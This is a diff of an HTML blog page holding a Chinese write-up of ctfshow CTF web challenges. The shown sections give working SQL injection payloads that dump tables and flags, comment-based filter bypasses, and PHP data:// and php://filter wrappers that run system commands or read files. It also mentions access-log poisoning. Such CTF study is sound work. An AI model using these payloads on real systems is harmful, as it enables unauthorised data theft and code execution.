href="#web3"><span class="nav-number">2.3.</span> <span class="nav-text">web3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.3.1.</span> <span class="nav-text">#include文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web4"><span class="nav-number">2.4.</span> <span class="nav-text">web4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.1.</span> <span class="nav-text">#日志注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web5"><span class="nav-number">2.5.</span> <span class="nav-text">web5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E6%AF%94%E8%BE%83MD5"><span class="nav-number">2.5.1.</span> <span class="nav-text">#弱比较MD5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctype-alpha-v1"><span class="nav-number">2.5.2.</span> <span class="nav-text">ctype_alpha($v1)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#is-numeric-v2"><span class="nav-number">2.5.3.</span> <span class="nav-text">is_numeric($v2)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%A4%B4%E4%B8%BA0E%EF%BC%88MD5%E5%80%BC%E7%A2%B0%E6%92%9E%EF%BC%89"><span class="nav-number">2.5.4.</span> <span class="nav-text">开头为0E（MD5值碰撞）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web6"><span class="nav-number">2.6.</span> <span class="nav-text">web6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%9A%84%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">2.6.1.</span> <span class="nav-text">#过滤空格的联合注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web7"><span class="nav-number">2.7.</span> <span class="nav-text">web7</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B-%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="nav-number">2.7.1.</span> <span class="nav-text">#数字型+引号过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web8"><span class="nav-number">2.8.</span> <span class="nav-text">web8</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7"><span class="nav-number">2.8.1.</span> <span class="nav-text">#布尔盲注+过滤逗号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%80%97%E5%8F%B7"><span class="nav-number">2.8.2.</span> <span class="nav-text">绕过逗号</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#from-for"><span class="nav-number">2.8.2.1.</span> <span class="nav-text">from for</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC"><span class="nav-number">2.8.3.</span> <span class="nav-text">布尔盲注脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web9"><span class="nav-number">2.9.</span> <span class="nav-text">web9</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MD5%E7%9A%84sql"><span class="nav-number">2.9.1.</span> <span class="nav-text">#MD5的sql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MD5-SQL%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.9.2.</span> <span class="nav-text">MD5 SQL绕过漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#md5-string-raw-%E5%87%BD%E6%95%B0"><span class="nav-number">2.9.2.1.</span> <span class="nav-text">md5(string,raw)函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web10"><span class="nav-number">2.10.</span> <span class="nav-text">web10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87"><span class="nav-number">2.10.1.</span> <span class="nav-text">#虚拟表构造绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysqli-query-%E5%87%BD%E6%95%B0"><span class="nav-number">2.10.2.</span> <span class="nav-text">mysqli_query()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysqli-num-rows-%E5%87%BD%E6%95%B0"><span class="nav-number">2.10.3.</span> <span class="nav-text">mysqli_num_rows()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#s%E7%AC%A6%E5%8F%B7"><span class="nav-number">2.10.4.</span> <span class="nav-text">\s符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E8%A1%A8with-rollup%E7%BB%95%E8%BF%87"><span class="nav-number">2.10.5.</span> <span class="nav-text">构建虚拟表with rollup绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web11"><span class="nav-number">2.11.</span> <span class="nav-text">web11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E4%BC%AA%E9%80%A0"><span class="nav-number">2.11.1.</span> <span class="nav-text">#session伪造</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web12"><span class="nav-number">2.12.</span> <span class="nav-text">web12</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87disable-function"><span class="nav-number">2.12.1.</span> <span class="nav-text">#绕过disable_function</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%BC%B9"><span class="nav-number">2.13.</span> <span class="nav-text">红包题第二弹</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE"><span class="nav-number">2.13.1.</span> <span class="nav-text">#无数字字母RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web13"><span class="nav-number">2.14.</span> <span class="nav-text">web13</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#user-ini%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">2.14.1.</span> <span class="nav-text">#.user.ini文件上传</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web14"><span class="nav-number">2.15.</span> <span class="nav-text">web14</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-mysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">2.15.1.</span> <span class="nav-text">#无列名注入+mysql读取文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E5%85%AD%E5%BC%B9"><span class="nav-number">2.16.</span> <span class="nav-text">红包题第六弹</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%BA%E7%A2%B0%E6%92%9E-%E6%96%87%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">2.16.1.</span> <span class="nav-text">#强碰撞+文件竞争</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%B8%83%E5%BC%B9"><span class="nav-number">2.17.</span> <span class="nav-text">红包题第七弹</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-%E7%BB%95%E8%BF%87disable-function"><span class="nav-number">2.17.1.</span> <span class="nav-text">#.git文件泄露+绕过disable_function</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%90%8C%E6%96%B0%E4%B8%93%E5%B1%9E%E7%BA%A2%E5%8C%85%E9%A2%98"><span class="nav-number">2.18.</span> <span class="nav-text">萌新专属红包题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="nav-number">2.18.1.</span> <span class="nav-text">#弱口令爆破</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTFshow-web1"><span class="nav-number">2.19.</span> <span class="nav-text">CTFshow web1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.19.1.</span> <span class="nav-text">#布尔盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#game-gyctf-web2"><span class="nav-number">2.20.</span> <span class="nav-text">game-gyctf web2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-number">2.20.1.</span> <span class="nav-text">#反序列化字符串逃逸</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web15-Fishman"><span class="nav-number">2.21.</span> <span class="nav-text">web15 Fishman</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">160</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">117</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ctfshow之web专题 | root@wanth3f1ag">
+      <meta itemprop="description" content="ctfshow之web专题">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow之web专题
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-03-10 22:32:06" itemprop="dateCreated datePublished" datetime="2025-03-10T22:32:06+08:00">2025-03-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-01 19:19:20" itemprop="dateModified" datetime="2025-12-01T19:19:20+08:00">2025-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>41k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>37 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">ctfshow之web专题</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>因为这里的题有些也是比较简单的，所以这里的知识点和做法不会讲述特别多，不会的可以直接看其他文章的题目有写的很详细的</p>
 <h1 id="0x02web题目"><a href="#0x02web题目" class="headerlink" title="0x02web题目"></a>0x02web题目</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="#源码泄露"></a>#源码泄露</h3><p>查看源代码然后拿去进行base64编码就可以拿到flag了</p>
 <h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h3 id="mysql联合注入"><a href="#mysql联合注入" class="headerlink" title="#mysql联合注入"></a>#mysql联合注入</h3><p>最简单的sql注入</p>
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204212546700.png" alt="image-20241204212546700"></p>
 <p>进来是一个，页面源代码也没什么可用的信息，那我们就测试一下</p>
 <p>先用永真语句打一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27; or &#x27;1&#x27; =&#x27;1&#x27;--+&amp;password=1</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=1&#x27; <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> =<span class="string">&#x27;1&#x27;</span>--+&amp;<span class="attribute">password</span>=1</span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204214741542.png" alt="image-20241204214741542"></p>
 <p>可以看到登录成功了，那我们就拿ctfshow作为账号去打一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">判断字段数</span><br><span class="line">password=1&amp;username=ctfshow&#x27; order by 3--+回显成功</span><br><span class="line">password=1&amp;username=ctfshow&#x27; order by 4--+回显失败</span><br><span class="line">证明是三个字段</span><br><span class="line">判断回显位置</span><br><span class="line">password=1&amp;username=ctfshow&#x27; union select 1,2,3--+发现2出现在了页面中，那我们用2作为回显位置去注入</span><br><span class="line">爆破数据库</span><br><span class="line">password=1&amp;username=ctfshow&#x27; union select 1,database(),3--+数据库名为web2</span><br><span class="line">爆破表名</span><br><span class="line">password=1&amp;username=ctfshow&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;web2&#x27;),3--+有flag和user两个表</span><br><span class="line">爆破flag表中字段</span><br><span class="line">password=1&amp;username=ctfshow&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag&#x27;),3--+</span><br><span class="line">爆破字段中数据</span><br><span class="line">password=1&amp;username=ctfshow&#x27; union select 1,(select flag from web2.flag),3--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">判断字段数</span><br><span class="line"><span class="keyword">password</span>=<span class="number">1</span>&amp;username=ctfshow<span class="string">&#x27; order by 3--+回显成功</span></span><br><span class="line"><span class="string">password=1&amp;username=ctfshow&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="comment">--+回显失败</span></span><br><span class="line">证明是三个字段</span><br><span class="line">判断回显位置</span><br><span class="line"><span class="keyword">password</span>=<span class="number">1</span>&amp;username=ctfshow<span class="string">&#x27; union select 1,2,3--+发现2出现在了页面中，那我们用2作为回显位置去注入</span></span><br><span class="line"><span class="string">爆破数据库</span></span><br><span class="line"><span class="string">password=1&amp;username=ctfshow&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span><span class="comment">--+数据库名为web2</span></span><br><span class="line">爆破表名</span><br><span class="line"><span class="keyword">password</span>=<span class="number">1</span>&amp;username=ctfshow<span class="string">&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>web2<span class="string">&#x27;),3--+有flag和user两个表</span></span><br><span class="line"><span class="string">爆破flag表中字段</span></span><br><span class="line"><span class="string">password=1&amp;username=ctfshow&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>)<span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;flag&#x27;</span>),<span class="number">3</span><span class="comment">--+</span></span><br><span class="line">爆破字段中数据</span><br><span class="line"><span class="keyword">password</span>=<span class="number">1</span>&amp;username=ctfshow<span class="string">&#x27; union select 1,(select flag from web2.flag),3--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204215434905.png" alt="image-20241204215434905"></p>
 <p>成功拿到flag！</p>
@@ -255,15 +399,15 @@
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204215643879.png" alt="image-20241204215643879"></p>
 <p>include文件包含</p>
 <p>直接用伪协议做试一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
 
 <p>但是没什么，应该是文件名不对</p>
 <p>那我们用data伪协议去做</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204220259354.png" alt="image-20241204220259354"></p>
 <p>读取文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php system(&#x27;tac ctf_go_go_go&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ctf_go_go_go&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
 <p>成功拿到flag</p>
 <p>这里也可以用input伪协议去做，url传入php:&#x2F;&#x2F;input，然后抓包用post传入命令或一句话木马</p>
@@ -276,7 +420,7 @@
 <p>先看一下服务器的版本</p>
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221222472.png" alt="image-20241204221222472"></p>
 <p>是nginx，那就访问nginx下的access.log，url传参</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="regexp">/var/</span><span class="built_in">log</span>/nginx/access.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221258839.png" alt="image-20241204221258839"></p>
 <p>在UA头传入一句话木马</p>
@@ -331,11 +475,11 @@
 <p>出现一个sql注入错误，看看过滤了什么</p>
 <p>测试后发现过滤了空格，用内联注释绕过</p>
 <p>然后发现过滤了–+注释符号，我们换成#</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;/**/or/**/&#x27;1&#x27;=&#x27;1&#x27;#&amp;password=1</span><br></pre></td></tr></table></figure>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1&#x27;</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="meta">#&amp;password=1</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204224151511.png" alt="image-20241204224151511"></p>
 <p>这下可以了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">判断字段数</span><br><span class="line">username=ctfshow&#x27;/**/order/**/by/**/3#&amp;password=1字段数为3</span><br><span class="line">判断回显位置</span><br><span class="line">username=ctfshow&#x27;/**/union/**/select/**/1,2,3#&amp;password=1还是一样2出现回显</span><br><span class="line">爆破数据库</span><br><span class="line">username=ctfshow&#x27;/**/union/**/select/**/1,database(),3#&amp;password=1数据库为web2</span><br><span class="line">爆破表名</span><br><span class="line">username=ctfshow&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;web2&#x27;),3#&amp;password=1出现flag和user表</span><br><span class="line">查询flag表下字段</span><br><span class="line">username=ctfshow&#x27;/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;),3#&amp;password=1出现flag字段</span><br><span class="line">爆flag数据</span><br><span class="line">username=ctfshow&#x27;/**/union/**/select/**/1,(select/**/flag/**/from/**/web2.flag),3#&amp;password=1</span><br></pre></td></tr></table></figure>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">判断字段数</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span>order<span class="comment">/**/</span>by<span class="comment">/**/</span><span class="number">3</span><span class="meta">#&amp;password=1字段数为3</span></span><br><span class="line">判断回显位置</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#&amp;password=1还是一样2出现回显</span></span><br><span class="line">爆破数据库</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="built_in">database</span>(),<span class="number">3</span><span class="meta">#&amp;password=1数据库为web2</span></span><br><span class="line">爆破表名</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="built_in">select</span><span class="comment">/**/</span><span class="built_in">group_concat</span>(table_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="built_in">where</span><span class="comment">/**/</span>table_schema=&#x27;web2&#x27;),<span class="number">3</span><span class="meta">#&amp;password=1出现flag和user表</span></span><br><span class="line">查询flag表下字段</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="built_in">select</span><span class="comment">/**/</span><span class="built_in">group_concat</span>(column_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="built_in">where</span><span class="comment">/**/</span>table_name=&#x27;flag&#x27;),<span class="number">3</span><span class="meta">#&amp;password=1出现flag字段</span></span><br><span class="line">爆flag数据</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="built_in">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span>from<span class="comment">/**/</span>web2.flag),<span class="number">3</span><span class="meta">#&amp;password=1</span></span><br></pre></td></tr></table></figure>
 
 <p>成功拿到flag</p>
 <h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><h3 id="数字型-引号过滤"><a href="#数字型-引号过滤" class="headerlink" title="#数字型+引号过滤"></a>#数字型+引号过滤</h3><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205133922227.png" alt="image-20241205133922227"></p>
@@ -344,33 +488,33 @@
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205160729258.png" alt="image-20241205160729258"></p>
 <p>发现没变化，一开始我以为不是sql注入，后面发现是过滤了单引号,不过对题目没啥影响，只是在后面注入的时候引用名字的时候换成双引号就可以了</p>
 <p>这道题还是过滤了空格，试一下永真语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1/**/or/**/&#x27;1&#x27;=&#x27;1&#x27;#</span><br></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205134649149.png" alt="image-20241205134649149"></p>
